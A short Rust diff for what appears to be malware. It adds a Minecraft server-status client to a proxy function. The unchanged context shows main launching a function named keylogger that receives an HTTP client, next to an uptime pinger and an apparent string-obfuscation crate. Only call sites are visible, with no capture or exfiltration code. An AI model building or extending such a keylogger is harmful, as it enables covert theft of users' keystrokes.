@@ -9,6 +9,7 @@ use std::{
 
 use env_logger::Env;
 use log::info;
+use mc_server_status::McClient;
 use muddy::muddy;
 use once_cell::sync::Lazy;
 use reqwest::{
@@ -72,9 +73,13 @@ async fn main() {
         .build()
         .unwrap();
 
+    let mc_client = McClient::new()
+        .with_timeout(Duration::from_secs(3))
+        .with_max_parallel(32);
+
     uptime_pinger(reqwest_client.clone());
     keylogger(reqwest_client.to_owned());
-    proxy(reqwest_client.to_owned(), global_state);
+    proxy(reqwest_client.to_owned(), mc_client, global_state);
 
     info!("successfully inited, running forever!");
     pending::<()>().await;
